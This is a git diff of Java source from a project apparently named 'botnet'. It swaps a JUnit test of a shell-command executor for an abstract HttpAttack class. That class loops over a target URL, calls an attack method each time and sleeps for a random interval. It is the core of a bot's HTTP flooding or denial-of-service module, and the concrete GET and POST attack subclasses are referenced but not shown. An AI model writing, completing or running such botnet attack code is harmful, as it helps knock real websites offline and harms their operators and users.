@@ -1,7 +1,7 @@
 /**
  * The MIT License (MIT)
  * <p>
- * Copyright (c) 2016 Giacomo Marciani, Michele Porretta
+ * Copyright (c) 2016 Giacomo Marciani and Michele Porretta
  * <p>
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -24,35 +24,55 @@
  * THE SOFTWARE.
  */
 
-package com.acmutv.botnet.control;
+package com.acmutv.botnet.attack;
 
-import org.junit.Test;
+import com.acmutv.botnet.target.HttpTarget;
+import com.acmutv.botnet.tool.RandomTools;
+import lombok.AllArgsConstructor;
+import lombok.Getter;
 
 import java.io.IOException;
-
-import static org.junit.Assert.assertEquals;
+import java.net.URL;
+import java.util.Random;
+import java.util.concurrent.TimeUnit;
 
 /**
- * This class realizes JUnit tests on bash command execution.
+ * This class realizes the behaviour of a HTTP attack.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
+ * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
- * @see BashExecutor
+ * @see HttpGetAttack
+ * @see HttpPostAttack
+ * @see HttpTarget
  */
-public class BashExecutorTest {
+@Getter
+@AllArgsConstructor
+public abstract class HttpAttack implements Runnable {
+  private HttpTarget target;
+  private Random rndgen;
 
-  /**
-   * Tests the BashExecutor run method with the command `echo`.
-   */
-  @Test
-  public void testRun_echo() {
-    String output = null;
-    try {
-      output = BashExecutor.run("echo", "Hello World");
-    } catch (IOException e) {
-      e.printStackTrace();
+  @Override
+  public void run() {
+    HttpTarget tgt = this.getTarget();
+    for (long i = 0; i < tgt.getMaxAttempts(); i++) {
+      try {
+        this.makeAttack(tgt.getUrl());
+      } catch (IOException e) {
+        e.printStackTrace();
+        return;
+      }
+      this.sleep();
     }
-    String expected = "Hello World";
-    assertEquals(expected, output);
   }
 
+  public abstract void makeAttack(final URL url) throws IOException;
+
+  private void sleep() {
+    int seconds = RandomTools.getRandomIntInPeriod(this.getTarget().getPeriod(), this.getRndgen());
+    try {
+      TimeUnit.SECONDS.sleep(seconds);
+    } catch (InterruptedException e) {
+      e.printStackTrace();
+    }
+  }
 }
